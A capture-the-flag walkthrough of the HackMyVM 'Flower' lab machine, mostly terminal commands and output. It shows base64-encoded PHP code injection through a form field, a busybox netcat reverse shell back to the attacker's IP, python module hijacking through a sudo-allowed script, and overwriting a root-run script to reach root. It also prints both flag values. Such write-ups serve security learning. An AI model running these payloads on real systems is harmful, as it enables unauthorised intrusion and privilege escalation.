# Flower

## Information

## Solution

### Enumeration
#### Nmap Discovery
```bash
┌──(dungcngo㉿kali)-[/tmp]
└─$ nmap -sVC -p- -T4 10.11.5.28
Starting Nmap 7.95 ( https://nmap.org ) at 2026-05-25 13:50 +07
Nmap scan report for 10.11.5.28
Host is up (0.00053s latency).
Not shown: 65534 closed tcp ports (reset)
PORT   STATE SERVICE VERSION
80/tcp open  http    Apache httpd 2.4.38 ((Debian))
|_http-title: Site doesn't have a title (text/html; charset=UTF-8).
|_http-server-header: Apache/2.4.38 (Debian)
MAC Address: 08:00:27:89:70:CA (PCS Systemtechnik/Oracle VirtualBox virtual NIC)

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 25.00 seconds
```
![web](/walkthroughs/hackmyvm/machines/beginner/Flower/web.png)

![source-page](/walkthroughs/hackmyvm/machines/beginner/Flower/source-page.png)

```bash
┌──(dungcngo㉿kali)-[/tmp]
└─$ echo "MSsy" | base64 -d
1+2                                                                                      
┌──(dungcngo㉿kali)-[/tmp]
└─$ echo "Misz" | base64 -d
2+3                                                                                      
┌──(dungcngo㉿kali)-[/tmp]
└─$ echo "Mys1" | base64 -d
3+5                                                                                      
┌──(dungcngo㉿kali)-[/tmp]
└─$ echo "NSs4" | base64 -d
5+8                                                                                      
┌──(dungcngo㉿kali)-[/tmp]
└─$ echo "OCsxMw" | base64 -d
8+13                                                                                      
┌──(dungcngo㉿kali)-[/tmp]
└─$ echo "MTMrMjE" | base64 -d
13+21                                                                                      
┌──(dungcngo㉿kali)-[/tmp]
└─$ echo "MjErMzQ" | base64 -d
21+34 
```


### Initial Access
```bash
┌──(dungcngo㉿kali)-[/tmp]
└─$ echo 'system("id")' | base64                     
c3lzdGVtKCJpZCIpCg==
```
```bash
┌──(dungcngo㉿kali)-[/tmp]
└─$ curl -X POST http://10.11.5.28/ -d "petals=c3lzdGVtKCJpZCIpCg==" 
<!DOCTYPE html>
<html>
    <head>
    <style>
    html {
      background: url(flower.jpg) no-repeat center center fixed; 
      background-size: cover;
     }
    </style>
    </head>
    <body>
        <h1 style="background-color:pink;">Count Petals</h1>
         <label for="flowers" style="background-color:pink;">Choose a flower to count petals:</label>
         <select name="petals" form="flosub">
            <option name="Lily" value="MSsy">Lily</option>
            <option name="Buttercup" value="Misz">Buttercup</option>
            <option name="Delphiniums" value="Mys1">Delphiniums</option>
            <option name="Cineraria" value="NSs4">Cineraria</option>
            <option name="Chicory" value="OCsxMw==">Chicory</option>
            <option name="Chrysanthemum" value="MTMrMjE=">Chrysanthemum</option>
            <option name="Michaelmas daisies" value="MjErMzQ=">Michaelmas daisies</option>
         </select> 
        <form action="/" method="post" id="flosub">
         <input type="submit" value="Submit">
        </form>
        <h2>

        uid=33(www-data) gid=33(www-data) groups=33(www-data)
uid=33(www-data) gid=33(www-data) groups=33(www-data) petals 
        </h2>
    </body>
</html>
```

```bash
┌──(dungcngo㉿kali)-[/tmp]
└─$ echo 'system("busybox nc 10.11.5.4 4444 -e sh")' | base64
c3lzdGVtKCJidXN5Ym94IG5jIDEwLjExLjUuNCA0NDQ0IC1lIHNoIikK
                                                                                      
┌──(dungcngo㉿kali)-[/tmp]
└─$ curl -X POST http://10.11.5.28/ -d "petals=c3lzdGVtKCJidXN5Ym94IG5jIDEwLjExLjUuNCA0NDQ0IC1lIHNoIikK"

```
```bash
┌──(dungcngo㉿kali)-[/tmp]
└─$ nc -lvnp 4444 
listening on [any] 4444 ...
connect to [10.11.5.4] from (UNKNOWN) [10.11.5.28] 57828
id; hostname
uid=33(www-data) gid=33(www-data) groups=33(www-data)
flower
which python3
/usr/bin/python3
python3 -c 'import pty;pty.spawn("/bin/bash")'
www-data@flower:/var/www/html$ ^Z
zsh: suspended  nc -lvnp 4444
                                                                                     
┌──(dungcngo㉿kali)-[/tmp]
└─$ stty raw -echo; fg                 
[1]  + continued  nc -lvnp 4444
                               export SHELL=bash
www-data@flower:/var/www/html$ export TERM=xterm-256color
www-data@flower:/var/www/html$
```

#### Internal Enumeration
```bash
www-data@flower:/var/www/html$ cd /
www-data@flower:/$ ls
bin   diary  initrd.img      lib32   lost+found  opt   run   sys  var
boot  etc    initrd.img.old  lib64   media       proc  sbin  tmp  vmlinuz
dev   home   lib             libx32  mnt         root  srv   usr  vmlinuz.old
www-data@flower:/$ cd home/
www-data@flower:/home$ ls
rose
www-data@flower:/home$ cd rose/
www-data@flower:/home/rose$ ls
diary  user.txt
www-data@flower:/home/rose$ ls -la
total 32
drwxrwxr-x 3 rose rose 4096 Nov 30  2020 .
drwxr-xr-x 3 root root 4096 Nov 30  2020 ..
-rw-r--r-- 1 rose rose  220 Nov 30  2020 .bash_logout
-rw-r--r-- 1 rose rose 3526 Nov 30  2020 .bashrc
-rwx------ 1 rose rose  120 Nov 30  2020 .plantbook
-rw-r--r-- 1 rose rose  807 Nov 30  2020 .profile
drwxrwxrwx 2 rose rose 4096 Nov 30  2020 diary
-rw------- 1 rose rose   20 Nov 30  2020 user.txt
```

```bash
www-data@flower:/home/rose$ cd diary/
www-data@flower:/home/rose/diary$ ls
diary.py
www-data@flower:/home/rose/diary$ python3 diary.py 
www-data@flower:/home/rose/diary$ cat diary.py
import pickle

diary = {"November28":"i found a blue viola","December1":"i lost my blue viola"}
p = open('diary.pickle','wb')
pickle.dump(diary,p)
www-data@flower:/home/rose/diary$ sudo -l
Matching Defaults entries for www-data on flower:
    env_reset, mail_badpass,
    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin

User www-data may run the following commands on flower:
    (rose) NOPASSWD: /usr/bin/python3 /home/rose/diary/diary.py
```

```bash
www-data@flower:/home/rose/diary$ echo 'import os; os.system("/bin/bash")' > pickle.py
www-data@flower:/home/rose/diary$ cat pickle.py 
import os; os.system("/bin/bash")
www-data@flower:/home/rose/diary$
```
```bash
www-data@flower:/home/rose/diary$ sudo -u rose /usr/bin/python3 /home/rose/diary/diary.py
rose@flower:~/diary$ id; hostname
uid=1000(rose) gid=1000(rose) groups=1000(rose),24(cdrom),25(floppy),29(audio),30(dip),44(video),46(plugdev),109(netdev),111(bluetooth)
flower
```

#### Flags (user.txt)
```bash
rose@flower:~/diary$ cd 
rose@flower:~$ ls
diary  user.txt
rose@flower:~$ cat user.txt 
HMV{R0ses_are_R3d$}
```

### Privilege Escalation
#### Sudo Enumeration
```bash
rose@flower:~$ sudo -l
Matching Defaults entries for rose on flower:
    env_reset, mail_badpass,
    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin

User rose may run the following commands on flower:
    (root) NOPASSWD: /bin/bash /home/rose/.plantbook
rose@flower:~$ ls -la /home/rose/.plantbook
-rwx------ 1 rose rose 120 Nov 30  2020 /home/rose/.plantbook
rose@flower:~$ cat /home/rose/.plantbook
#!/bin/bash
echo Hello, write the name of the flower that u found
read flower
echo Nice, $flower submitted on : $(date)
```

#### Abuse
```bash
rose@flower:~$ cp /home/rose/.plantbook /home/rose/.plantbook.backup
rose@flower:~$ echo "/bin/bash" > /home/rose/.plantbook
rose@flower:~$ sudo /bin/bash /home/rose/.plantbook
root@flower:/home/rose# id;hostname
uid=0(root) gid=0(root) groups=0(root)
flower
```
#### Flags (root.txt)
```bash
root@flower:/home/rose# cd /root
root@flower:~# ls
root.txt
root@flower:~# cat root.txt 
HMV{R0ses_are_als0_black.}
```


***You are welcome!***
